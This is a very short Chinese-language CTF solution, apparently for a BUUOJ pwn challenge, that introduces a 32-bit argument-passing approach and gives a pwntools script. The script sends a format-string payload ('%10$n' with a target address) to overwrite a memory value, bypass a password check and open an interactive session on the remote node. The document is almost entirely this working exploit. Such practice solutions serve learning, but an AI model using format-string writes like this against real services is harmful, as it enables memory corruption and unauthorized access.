根据32位传参的方法，我们来写这个题



```python
from pwn import *
r=remote('node5.buuoj.cn',29712)

r.recvuntil('your name:')
payload1=p32(0x0804c044)+b'%10$n'
r.sendline(payload1)

r.recvuntil('your passwd:')
r.sendline(b'4')

r.interactive()
```
